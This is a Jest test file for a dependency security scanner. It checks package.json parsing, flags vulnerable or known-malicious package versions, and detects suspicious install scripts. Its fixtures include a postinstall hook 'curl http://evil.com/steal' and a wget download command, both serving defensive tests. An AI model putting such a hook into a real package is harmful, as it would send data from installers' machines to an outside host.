import {
  parsePackageJson,
  scanDependencies,
  scanPackageJson,
} from '@/lib/security/dependency';

describe('Dependency Scanner', () => {
  describe('parsePackageJson', () => {
    it('should parse valid package.json', () => {
      const content = JSON.stringify({
        name: 'test',
        dependencies: { lodash: '4.17.21' },
        devDependencies: { jest: '^29.0.0' },
      });

      const result = parsePackageJson(content);
      expect(result).not.toBeNull();
      expect(result?.dependencies).toEqual({ lodash: '4.17.21' });
      expect(result?.devDependencies).toEqual({ jest: '^29.0.0' });
    });

    it('should return null for invalid JSON', () => {
      const result = parsePackageJson('not json');
      expect(result).toBeNull();
    });

    it('should handle missing dependencies', () => {
      const content = JSON.stringify({ name: 'test' });
      const result = parsePackageJson(content);
      expect(result?.dependencies).toEqual({});
      expect(result?.devDependencies).toEqual({});
    });
  });

  describe('scanDependencies', () => {
    it('should detect vulnerable lodash version', () => {
      const findings = scanDependencies(
        { lodash: '4.17.20' },
        {}
      );

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].category).toBe('Vulnerable Dependency');
      expect(findings[0].title).toContain('lodash');
    });

    it('should not flag patched lodash version', () => {
      const findings = scanDependencies(
        { lodash: '4.17.21' },
        {}
      );

      const lodashVuln = findings.find((f) => f.title.includes('lodash'));
      expect(lodashVuln).toBeUndefined();
    });

    it('should detect malicious packages', () => {
      const findings = scanDependencies(
        { 'event-stream': '3.3.4' },
        {}
      );

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].severity).toBe('critical');
    });

    it('should scan devDependencies', () => {
      const findings = scanDependencies(
        {},
        { 'node-serialize': '0.0.4' }
      );

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].severity).toBe('critical');
    });

    it('should return empty for safe packages', () => {
      const findings = scanDependencies(
        { react: '^18.0.0', next: '^14.0.0' },
        { typescript: '^5.0.0' }
      );

      expect(findings).toHaveLength(0);
    });
  });

  describe('scanPackageJson', () => {
    it('should detect invalid JSON', async () => {
      const findings = await scanPackageJson('invalid json');
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].category).toBe('Configuration');
    });

    it('should detect curl in scripts', async () => {
      const content = JSON.stringify({
        scripts: {
          postinstall: 'curl http://evil.com/steal',
        },
      });

      const findings = await scanPackageJson(content);
      const scriptFinding = findings.find(
        (f) => f.category === 'Suspicious Scripts'
      );
      expect(scriptFinding).toBeDefined();
      expect(scriptFinding?.severity).toBe('high');
    });

    it('should detect wget in scripts', async () => {
      const content = JSON.stringify({
        scripts: {
          test: 'wget http://example.com/file',
        },
      });

      const findings = await scanPackageJson(content);
      const scriptFinding = findings.find(
        (f) => f.category === 'Suspicious Scripts'
      );
      expect(scriptFinding).toBeDefined();
    });

    it('should return clean for safe package.json', async () => {
      const content = JSON.stringify({
        name: 'safe-package',
        version: '1.0.0',
        scripts: {
          build: 'next build',
          test: 'jest',
        },
        dependencies: {
          react: '^18.0.0',
        },
      });

      const findings = await scanPackageJson(content);
      expect(findings).toHaveLength(0);
    });
  });
});
